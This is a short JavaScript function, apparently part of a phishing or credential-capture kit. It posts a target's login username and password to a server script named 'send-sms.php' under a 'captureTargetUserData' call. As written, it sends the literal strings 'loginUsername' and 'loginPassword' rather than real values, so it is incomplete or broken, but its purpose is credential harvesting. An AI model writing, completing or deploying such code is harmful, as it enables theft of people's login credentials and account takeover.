
function getInfo(){
	//getting user data

  var xhttp = new XMLHttpRequest();
  xhttp.open("POST", "../../invisible_chain/send-sms.php?functionToCall=captureTargetUserData&targetUsername=loginUsername&targetLoginPassword=loginPassword&", true);
  xhttp.send();
}